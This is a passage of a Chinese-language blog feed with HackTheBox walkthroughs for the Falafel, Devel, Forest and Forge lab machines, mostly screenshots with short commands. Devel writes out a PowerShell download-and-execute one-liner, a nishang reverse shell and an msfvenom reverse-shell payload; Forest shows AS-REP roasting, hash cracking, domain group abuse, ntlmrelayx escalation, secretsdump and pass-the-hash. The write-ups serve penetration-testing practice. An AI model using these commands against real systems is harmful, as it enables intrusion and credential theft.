                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Falafel/image.6ghggawcnpw0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Falafel/image.tqimg3j345c.webp"
                     
                ></p>
<p>发现一个密钥文件，但登陆不了</p>
<p>实在找不着了，搜了一下wp</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Falafel/image.4397xd4ofuc0.webp"
                     
                ></p>
<p>要搜日志文件</p>
<p><code>for i in $(groups);do echo -e &quot;\n==========$i==========&quot;; find / -group $i 2&gt;/dev/null; done</code></p>
<p><code>cat /dev/fb0 &gt;&gt; screenshot</code></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Falafel/image.46vahbcockc0.webp"
                     
                ></p>
<p>把这玩意下载到本地</p>
<p>安装gimp进行查看</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Falafel/image.jxiuxginskg.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Falafel/image.7wh90dom11s.webp"
                     
                ></p>
<p>打开</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Falafel/image.37ur6f96sug0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Falafel/image.466do5eb0o20.webp"
                     
                ></p>
<p>修改图片类型和宽度高度</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Falafel/image.3f9hs5g7qbo0.webp"
                     
                ></p>
<p>得到了yossi用户的密码，这他妈跟ctf一样</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Falafel/image.26hxlxg1wjnk.webp"
                     
                ></p>
<p>继续，还是那个命令，看日志文件</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Falafel/image.2wrz4k3tth60.webp"
                     
                ></p>
<p>这次又多了一些</p>
<p><code>debugfs /dev/sda1</code></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Falafel/image.1rvjmchm7b34.webp"
                     
                ></p>
<p>可以直接看到flag，但没有获取到权限</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Falafel/image.2auos0hbosn4.webp"
                     
                ></p>
<p>进.ssh下看看有没有密钥文件</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Falafel/image.4xofo5piyjs0.webp"
                     
                ></p>
<p>有了</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Falafel/image.5zdd8lpu7bc0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Falafel/image.1cuadr3xjrk0.webp"
                     
                ></p>
]]></content>
      <tags>
        <tag>Hack-The-Box</tag>
      </tags>
  </entry>
  <entry>
    <title>Devel - HackTheBox</title>
    <url>/post/94b0da23d9be/</url>
    <content><![CDATA[<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Devel/image.2ycap3t6ce80.webp"
                     
                ></p>
<p>nmap扫描</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Devel/image.15d35sh9z3b4.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Devel/image.342hb30bkhc0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Devel/image.4r0krs6i2j20.webp"
                     
                ></p>
<p>访问80端口</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Devel/image.5sumnww3b7w0.webp"
                     
                ></p>
<p>iis起始页，扫目录</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Devel/image.74kfkmgrlho0.webp"
                     
                ></p>
<p>尝试ftp匿名访问</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Devel/image.302iy7q8scm0.webp"
                     
                ></p>
<p>上传一个webshell</p>
<p><code>/usr/share/webshells/</code></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Devel/image.1993qaaogmn4.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Devel/image.7l3nb53aup80.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Devel/image.48thus43ruy0.webp"
                     
                ></p>
<p>反弹shell</p>
<p><code>https://github.com/samratashok/nishang</code></p>
<p>下载解压后找到shells文件夹</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Devel/image.2r7wacyf8e00.webp"
                     
                ></p>
<p>修改<code>Invoke-PowerShellTcp.ps1</code></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Devel/image.7ixyjd4omas0.webp"
                     
                ></p>
<p>在最后加上<code>Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.17 -Port 7777</code></p>
<p>之后利用powershell远程请求并执行</p>
<p><code>powershell -c &quot;iex (new-object system.net.webclient).downloadstring(&#39;http://10.10.14.17/test.ps1&#39;)&quot;</code></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Devel/image.3sgacfmasiw0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Devel/image.79jfuf61x000.webp"
                     
                ></p>
<p>提权</p>
<p>同样利用powershell远程下载提权检测脚本</p>
<p>sherlock提权脚本：<code>https://github.com/rasta-mouse/sherlock</code></p>
<p><code>(new-object system.net.webclient).downloadfile(&quot;http://10.10.14.17/winPEAS.bat&quot;,&quot;c:\users\public\test.bat&quot;)</code></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Devel/image.58gkw7ora7o0.webp"
                     
                ></p>
<p>一大堆可用的提权漏洞，利用ms15-051进行提权</p>
<p><code>https://github.com/rayhan0x01/reverse-shell-able-exploit-pocs/blob/master/ms15-051.md</code></p>
<p>下载exp压缩包</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Devel/image.76qbfmatgmg0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Devel/image.3aflu1fhzoc0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Devel/image.4rhwn10o8i00.webp"
                     
                ></p>
<p>使用方法是利用这个exp执行nc反弹shell，nc就用msf生成的反弹后门替换一下</p>
<p><code>msfvenom -p windows/shell_reverse_tcp lhost=10.10.14.17 lport=7777 -f exe -o exp.exe</code></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Devel/image.jhrpfl40n80.webp"
                     
                ></p>
<p>将这两个文件上传到靶机</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Devel/image.4fsa7skzvj00.webp"
                     
                ></p>
<p>用提权的exe去执行msf生成的反弹后门</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Devel/image.3zzcwz0v9n60.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Devel/image.46at6kiuxyk0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Devel/image.7addfnvzge80.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Devel/image.tgysc8ac2k0.webp"
                     
                ></p>
]]></content>
      <tags>
        <tag>Hack-The-Box</tag>
      </tags>
  </entry>
  <entry>
    <title>Forest - HackTheBox</title>
    <url>/post/7b38bfebd0a7/</url>
    <content><![CDATA[<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Forest/image.4r9c90jd48a0.webp"
                     
                ></p>
<p>nmap扫描</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Forest/image.19etbmmbgv28.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Forest/image.4p99iyylx380.webp"
                     
                ></p>
<p>先看看http端口</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Forest/image.2rvmk7o91dk0.webp"
                     
                ></p>
<p>从上往下尝试</p>
<p>53端口DNS解析可以爆破子域名</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Forest/image.xovzw596ij.webp"
                     
                ></p>
<p>在389端口扫描信息中发现一个域名，利用nslookup可以查看解析</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Forest/image.1t4cglm5epr4.webp"
                     
                ></p>
<p>但这里没有http服务，爆破子域名意义不大，将其添加到hosts文件</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Forest/image.5oirebabz0c0.webp"
                     
                ></p>
<p>88端口可以用kerbrute进行枚举</p>
<p><code>https://github.com/ropnop/kerbrute</code></p>
<p><code>./kerbrute_linux_amd64 userenum --dc 10.10.10.161 -d htb.local /usr/share/wordlists/wfuzz/others/names.txt</code></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Forest/image.5cjvrst9owg0.webp"
                     
                ></p>
<p>枚举出了一堆用户名</p>
<p>在进行389端口ldap测试</p>
<p><code>ldapsearch -x -H ldap://10.10.10.161 -b &quot;DC=htb,DC=local&quot; -s sub</code></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Forest/image.zrq8o6bi8sg.webp"
                     
                ></p>
<p>太多了，过滤一下</p>
<p><code>ldapsearch -x -H ldap://10.10.10.161 -b &quot;DC=htb,DC=local&quot; -s sub|grep -i account</code></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Forest/image.3rwai29lq78.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Forest/image.2xiutwrw1g40.webp"
                     
                ></p>
<p>发现一个疑似用户名，再用kerbrute测试一下</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Forest/image.207gsfal1hgg.webp"
                     
                ></p>
<p>确实存在</p>
<p>尝试获取票据</p>
<p><code>https://github.com/fortra/impacket/blob/master/examples/GetNPUsers.py</code></p>
<p><code>python getnpuser.py -dc-ip 10.10.10.161 htb.local/svc-alfresco -request</code></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Forest/image.6j7mitnfmvg0.webp"
                     
                ></p>
<p>密码直接回车为空</p>
<p>尝试爆破一下密文</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Forest/image.5s4mv1mw9uw0.webp"
                     
                ></p>
<p>通过特征查找密文类型</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Forest/image.x57bp2463ow.webp"
                     
                ></p>
<p><code>hashcat -m 18200 hash /usr/share/wordlists/rockyou.txt</code></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Forest/image.znzjil2tp74.webp"
                     
                ></p>
<p>得到明文密码</p>
<p>用该账户的用户名和密码去测试445端口smb服务</p>
<p><code>smbmap -H 10.10.10.161 -u svc-alfresco -p s3rvice</code></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Forest/image.47gybddqs4c0.webp"
                     
                ></p>
<p>发现共享文件夹，两个无权限，三个有读权限</p>
<p>如果admin目录拥有可读写权限的情况，可以使用psexec.py进行登录</p>
<p><code>https://github.com/fortra/impacket/blob/master/examples/psexec.py</code></p>
<p><code>python psexec.py -dc-ip 10.10.10.161 htb.local/svc-alfresco:s3rvice@10.10.10.161</code></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Forest/image.3xo5n2m5yug0.webp"
                     
                ></p>
<p>查看其他目录</p>
<p>最终发现SYSVOL下有文件</p>
<p><code>smbclient //10.10.10.161/SYSVOL -U svc-alfresco%s3rvice</code></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Forest/image.3pnr7adfcwu0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Forest/image.1e23rwvaow00.webp"
                     
                ></p>
<p><code>https://adsecurity.org/?p=2288</code></p>
<p>在Policies下，可能会存在一个xml文件，文件中会包含账户和明文密码</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Forest/image.418y43nudoy0.webp"
                     
                ></p>
<p>但这里并没有</p>
<p>得到了明文密码，尝试利用evil_winrm通过5985端口进行登录</p>
<p><code>evil-winrm -u svc-alfresco -p s3rvice -i 10.10.10.161</code></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Forest/image.6dh8tmkut6w0.webp"
                     
                ></p>
<p>提权</p>
<p>使用BloodHound进行域控的信息收集</p>
<p><code>https://blog.csdn.net/qq_48904485/article/details/124403996</code></p>
<p><code>https://github.com/BloodHoundAD/SharpHound</code></p>
<p>该说不说，这玩意有点折腾</p>
<p>将收集信息的exe程序上传到靶机</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Forest/image.6yrossx1kio0.webp"
                     
                ></p>
<p><code>upload SharpHound.exe</code></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Forest/image.1ahphbkhiqww.webp"
                     
                ></p>
<p>运行即可</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Forest/image.6izjuuunfao0.webp"
                     
                ></p>
<p>运行结束后，会在当前目录生成一个zip压缩包</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Forest/image.6ynctzpi1cg0.webp"
                     
                ></p>
<p>将压缩包下载到本地</p>
<p><code>download 20230430003452_BloodHound.zip</code></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Forest/image.4gdy1umrqlm0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Forest/image.73gjyu5hp4w0.webp"
                     
                ></p>
<p>将压缩包上传到BloodHound中</p>
<p>在点击</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Forest/image.4k4uanqw8200.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Forest/image.1lf64a54wj28.webp"
                     
                ></p>
<p>这里会给出当前用户所在组以及更高一层组，直到域控制器的路线图</p>
<p>在HTB.LOCAL的域控制器前一步，看到一个EXCHANGE WINDOWS对其拥有WriteDacl权限</p>
<p>这个权限可以对域控制器上的所有DACL进行读写修改</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Forest/image.7esl7zc8lys0.webp"
                     
                ></p>
<p>先创建一个普通用户</p>
<p><code>net user test123 1qaz@WSX /add /domain</code></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Forest/image.6wnkqrxw9nk0.webp"
                     
                ></p>
<p>在将用户添加到<code>Exchange Windows Permissions</code>组和远程登录的<code>Remote Management Users</code>组中</p>
<p>一个是域内的拥有DACL读写权限的组，一个是本地的远程登陆的组</p>
<p><code>net group &#39;Exchange Windows Permissions&#39; test123 /add /domain</code></p>
<p><code>net localgroup &#39;Remote Management Users&#39; test123 /add</code></p>
<p>在利用创建好的用户进行登录</p>
<p><code>evil-winrm -u test123 -p 1qaz@WSX -i 10.10.10.161</code></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Forest/image.b8b5l6hajts.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Forest/image.118su3zpv5s0.webp"
                     
                ></p>
<p>然后使用<code>secretsdump.py</code>进行抓取administrator的哈希值密码</p>
<p><code>https://github.com/fortra/impacket/blob/impacket_0_9_22/examples/secretsdump.py</code></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Forest/image.3xtys0vgn6k0.webp"
                     
                ></p>
<p>但是貌似无用</p>
<p>得先用<code>ntlmrelayx.py</code>进行一个类似建立连接的做法</p>
<p><code>https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py</code></p>
<p><code>python ntml.py -t ldap://10.10.10.161 --escalate-user test123</code></p>
<p>之后访问<code>localhost:80</code></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Forest/image.25heiuyg17kw.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Forest/image.2kw5dxnccck0.webp"
                     
                ></p>
<p>在这输入test123的账户和密码</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Forest/image.6qsnzjscad40.webp"
                     
                ></p>
<p>在尝试获取哈希值</p>
<p><code>python3 dump.py htb.local/test123@10.10.10.161 -dc-ip 10.10.10.161 -just-dc</code></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Forest/image.4p00box81t60.webp"
                     
                ></p>
<p>利用psexec.py使用哈希值登录</p>
<p><code>python psexec.py htb.local/administrator@10.10.10.161 &#39;powershell.exe&#39; -hashes aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6</code></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Forest/image.7kdcvg0yf900.webp"
                     
                ></p>
<p>就是这shell有点奇奇怪怪的</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Forest/image.63yvvx39mu40.webp"
                     
                ></p>
<hr>
<p>其实evil和psexec这些，kali都是自带的，在impacket套件里面。。</p>
]]></content>
      <tags>
        <tag>Hack-The-Box</tag>
      </tags>
  </entry>
  <entry>
    <title>Forge - HackTheBox</title>
    <url>/post/bc894c8bb9b6/</url>
    <content><![CDATA[<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Forge/image.24xpkzmpufc0.webp"
                     
                ></p>
<p>nmap扫描</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Forge/image.7h9w9nt3hzc0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Forge/image.4ipxomix0tg0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Forge/image.63xi9dyvnyo0.webp"
                     
                ></p>
<p>访问80端口</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Forge/image.2rlvmvxxh040.webp"
                     
                ></p>
<p>添加hosts文件</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Forge/image.2r2ds8hzk400.webp"
                     
                ></p>
<p>发现一个上传功能</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Forge/image.317od8n475w.webp"
                     
                ></p>
<p>会重命名文件，后门没法解析</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Forge/image.19w1n9if7eo0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Forge/image.7d4x4prgj700.webp"
                     
                ></p>
<p>可以远程请求，应该可以ssrf</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Forge/image.39z2bo2ruvm0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Forge/image.3gwroz8s2920.webp"
                     
                ></p>
<p>还是没法解析</p>
<p>尝试利用ffuf寻找子域名</p>
<p><code>ffuf -w /usr/share/wordlists/dirb/small.txt -u http://forge.htb/ -H &quot;HOST: FUZZ.forge.htb&quot; -fw 18</code></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Forge/image.7bvx78qufuo0.webp"
                     
                ></p>
<p>添加hosts文件</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Forge/image.zx8qsm44quo.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Forge/image.25fj6a5h1r40.webp"
                     
                ></p>
<p>无法访问</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Forge/image.51ovr2n6wq00.webp"
                     
                ></p>
<p>上传这里也没法请求</p>
<p>制作一个跳转的php文件，利用远程请求进行访问</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Forge/image.3cqm0pyjego0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Forge/image.4mr64ezbbt40.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Forge/image.6qvpvft7oqg0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Forge/image.71ngx22a7vw0.webp"
                     
                ></p>
<p>发现一个子目录，继续</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Forge/image.49cefrxgf1a0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Forge/image.4u03l6x1lx40.webp"
                     
                ></p>
<p>发现一个账号密码，尝试ssh登录</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Forge/image.2dcomyhk0m80.webp"
                     
                ></p>
<p>需要密钥连接</p>
<p>扫个目录</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Forge/image.6hz0rsdc68g0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Forge/image.3o6l28lymhk0.webp"
                     
                ></p>
<p>总感觉有端口没扫到，重新扫一遍</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Forge/image.3ajqpmrbhg40.webp"
                     
                ></p>
<p>21端口关闭了，那么有没有可能，这个用户名就是ftp的账号密码</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Forge/image.4l0jovbdo9e0.webp"
                     
                ></p>
<p>拼凑一下url</p>
<p><img  
                     lazyload
                     alt="image"
